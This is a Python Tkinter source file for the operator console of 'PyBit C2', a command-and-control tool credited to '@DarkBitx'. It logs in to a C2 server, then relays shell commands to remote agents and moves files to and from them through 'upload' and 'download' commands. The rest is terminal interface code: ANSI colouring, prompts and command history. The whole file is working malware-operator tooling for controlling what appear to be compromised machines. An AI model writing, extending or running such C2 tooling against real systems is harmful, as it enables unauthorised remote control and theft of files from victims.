from core.client import core
from core.utils import common
import tkinter as tk
from tkinter import messagebox
import threading
import time
import os
import re

# Mapping ANSI color codes to color tag names (must match your tag_config naming)
ANSI_COLOR_TAGS = {
    "30": "gray",
    "31": "red",
    "32": "green",
    "33": "yellow",
    "34": "blue",
    "35": "magenta",
    "36": "cyan",
    "37": "white",

    "90": "gray",
    "91": "light_red",
    "92": "light_green",
    "93": "light_yellow",
    "94": "light_blue",
    "95": "light_magenta",
    "96": "light_cyan",
    "97": "light_white",
}

# Tag colors (you can tweak these hex values as needed)
COLOR_HEX = {
    "gray": "#888888",
    "red": "#ff0000",
    "green": "#00cc00",
    "yellow": "#ffff00",
    "blue": "#3399ff",
    "magenta": "#cc00cc",
    "cyan": "#00cccc",
    "white": "#ffffff",

    "light_red": "#ff6666",
    "light_green": "#66ff66",
    "light_yellow": "#ffff99",
    "light_blue": "#99ccff",
    "light_magenta": "#ff99ff",
    "light_cyan": "#99ffff",
    "light_white": "#f0f0f0",
}




class LoginWindow:
    def __init__(self, master):
        self.master = master
        master.title("PyBit C2 - Connector")
        master.configure(bg="#1e1e1e")
        self.set_geometry_centered(300, 260)
        master.resizable(False, False)

        # Title
        self.title = tk.Label(master, text="💀 PyBit C2", fg="#00ff00", bg="#1e1e1e", font=("Consolas", 20, "bold"))
        self.title.pack(pady=5)

        # Channel mention
        self.channel = tk.Label(master, text="Provided by: @DarkBitx", fg="#888888", bg="#1e1e1e", font=("Consolas", 10))
        self.channel.pack(pady=5)

        # Input fields
        self.fields = {}
        for label in ["IP", "Port", "Username", "Password"]:
            frame = tk.Frame(master, bg="#1e1e1e")
            frame.pack(pady=5)
            lbl = tk.Label(frame, text=label + ":", fg="#00ff00", bg="#1e1e1e", width=10, anchor="e", font=("Consolas", 10))
            lbl.pack(side="left")
            entry = tk.Entry(frame, width=25, font=("Consolas", 10), show="*" if label == "Password" else "")
            entry.pack(side="left")
            self.fields[label.lower()] = entry

        # Connect Button
        self.connect_btn = tk.Button(master, text="Connect", bg="#007700", fg="white", font=("Consolas", 10), command=self.connect)
        self.connect_btn.pack(pady=15)

    def connect(self):
        ip = self.fields["ip"].get()
        port = self.fields["port"].get()
        user = self.fields["username"].get()
        password = self.fields["password"].get()

        if ip and port and user and password:
            self.master.withdraw()
            TerminalWindow(ip, port, user, password)
        else:
            messagebox.showerror("Missing Info", "Please fill in all fields.")
            
    def set_geometry_centered(self, win_w, win_h):
        screen_w = 1500
        screen_h = 850

        x = (screen_w - win_w) // 2
        y = (screen_h - win_h) // 2

        self.master.geometry(f"{win_w}x{win_h}+{x}+{y}")

class TerminalWindow:
    def __init__(self, ip, port, username, password):
        self.server_name = None
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password
        
        self.conn = None
        self.lock = threading.Lock()
        self.shared_cmd = None

        self.agent_id = None
        self.agent_shell = None

        self.command_history = []
        self.history_index = -1

        
        self.window = tk.Toplevel()
        self.window.title("PyBit C2 - Terminal")
        self.window.configure(bg="#000000")
        self.set_geometry_centered(700,500)
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)  # handle window close
        self.text = tk.Text(
            self.window, bg="#000000", fg="#ffffff",
            insertbackground="#00ff00", font=("Consolas", 12),
            wrap="word"
        )
        self.text.pack(fill="both", expand=True)

        # Scrollbar
        self.scrollbar = tk.Scrollbar(self.text, command=self.text.yview)
        self.text.configure(yscrollcommand=self.scrollbar.set)
        self.scrollbar.pack(side="right", fill="y")

        # Setup ANSI tags
        for tag, color in COLOR_HEX.items():
            self.text.tag_config(tag, foreground=color)
            
        self.insert_line(f"[*] Connecting to {ip}:{port} ...", "light_blue")
        self.text.update()

        self.text.bind("<Key>", self.on_keypress)
        self.text.bind("<Return>", self.handle_enter)
        self.text.bind("<Control-l>", lambda e: self.clear_screen())
        self.text.bind("<Up>", self.navigate_history_up)
        self.text.bind("<Down>", self.navigate_history_down)
        
        self.conn = set_conn(self.ip, self.port)
        core.handle_client(self)

    def set_geometry_centered(self, win_w, win_h):
        screen_w = 1500
        screen_h = 850

        x = (screen_w - win_w) // 2
        y = (screen_h - win_h) // 2

        self.window.geometry(f"{win_w}x{win_h}+{x}+{y}")

    def handle_enter(self, event=None):
        
        prompt = self.get_prompt_text()
        last_line = self.text.get("insert linestart", "insert lineend")

        if last_line.startswith(prompt):
            cmd = last_line[len(prompt):].strip()
        else:
            cmd = last_line.strip()

        self.text.insert("end", "\n")

        if cmd == "":
            self.insert_prompt()
            self.scroll_to_end()
            
        elif cmd == "clear":
            self.clear_screen()
            
        elif cmd.startswith("upload"):
            parts = cmd.split()
            if len(parts) == 3:
                cmd = parts[0]
                file_name = parts[1]
                file_path = parts[2]

                if not os.path.isfile(file_path):
                    self.insert_line("[-] File not found","light_red")
                    self.insert_prompt()
                    self.scroll_to_end()
                else:
                    with open(file_path, "rb") as f:
                        data = f.read()

                    data = cmd.encode() + b" " + file_name.encode() + b"::::" + data
                    self.set_command(data)
                    self.command_history.append(cmd)
                    self.history_index = len(self.command_history)
                    
        elif cmd.startswith("download"):
            parts = cmd.split()
            if len(parts) == 3:
                cmd = parts[0]
                file_name = parts[1]
                file_path = parts[2]

                data = cmd.encode() + b" " + file_name.encode() + b"::::" + file_path.encode()
                self.set_command(data)
            else:
                cmd = cmd.split()
                self.set_command(cmd[0])
                
            self.command_history.append(cmd)
            self.history_index = len(self.command_history)
            
            
        else:
            self.set_command(cmd)
            self.command_history.append(cmd)
            self.history_index = len(self.command_history)

        return "break"

    
    def set_command(self, cmd):
        with self.lock:
            self.shared_cmd = cmd

    def insert_line(self, line, tag="white"):
        """Insert plain line with optional ANSI color tag (default: white)."""
        self.text.insert("end", line + "\n", tag)
        self.scroll_to_end()

    def get_prompt_text(self):
        base = f"{self.username}@{self.server_name}"
        parts = [base]
        if self.agent_id and self.agent_id.strip():
            parts.append(f"[{self.agent_id}]")
            if self.agent_shell and self.agent_shell.strip():
                parts.append(f"[{self.agent_shell}]")
        return "".join(parts) + "# "

    def insert_prompt(self):
        prompt = self.get_prompt_text()
        self.text.insert("end", prompt, "32")
        self.scroll_to_end()

    def insert_ansi(self, text, insert_status=True):

        # Regex to split the ANSI escape codes
        parts = re.split(r'(\x1b\[\d{1,2}m)', text)
        current_tag = "white"  # Default style

        for part in parts:
            if re.match(r'\x1b\[(\d{1,2})m', part):
                code = part[2:-1]
                if code in ANSI_COLOR_TAGS:
                    current_tag = ANSI_COLOR_TAGS[code]
            elif part:
                self.text.insert("end", part, current_tag)
                
        if insert_status:
            self.insert_prompt()
        self.scroll_to_end()

        
    def remove_ansi_codes(self,text: str) -> str:
        ansi_escape = re.compile(r'\x1b\[\d{1,2}m')
        return ansi_escape.sub('', text)


    def navigate_history_up(self, event):
        if self.command_history and self.history_index > 0:
            self.history_index -= 1
            self.replace_current_command(self.command_history[self.history_index])
        return "break"

    def navigate_history_down(self, event):
        if self.command_history and self.history_index < len(self.command_history) - 1:
            self.history_index += 1
            self.replace_current_command(self.command_history[self.history_index])
        elif self.history_index == len(self.command_history) - 1:
            self.history_index += 1
            self.replace_current_command("")
        return "break"

    def replace_current_command(self, new_cmd):
        prompt = self.get_prompt_text()
        
        line_start = self.text.index("insert linestart")
        line_end = self.text.index("insert lineend")
        full_line = self.text.get(line_start, line_end)

        if full_line.startswith(prompt):
            self.text.delete(line_start + f"+{len(prompt)}c", line_end)
            self.text.insert(line_start + f"+{len(prompt)}c", new_cmd)
            
    def restore_cursor(self):
        self.text.mark_set(tk.INSERT, tk.END)
        self.scroll_to_end()

    def on_keypress(self, event):
        self.text.mark_set(tk.INSERT, tk.END)

    def scroll_to_end(self):
        self.text.see("end")

    def clear_screen(self, text=""):
        self.text.delete("1.0", tk.END)
        self.insert_ansi(text)

    def on_close(self):
        self.window.destroy()
        os._exit(0)

def set_conn(ip,port):
    client = core.Client(ip, port)
    client.connect()
    for _ in range(5):
        if client.get_socket() is not None:
            break
        time.sleep(1)
    return client.get_socket()


if __name__ == "__main__":
    root = tk.Tk()
    app = LoginWindow(root)
    root.mainloop()
    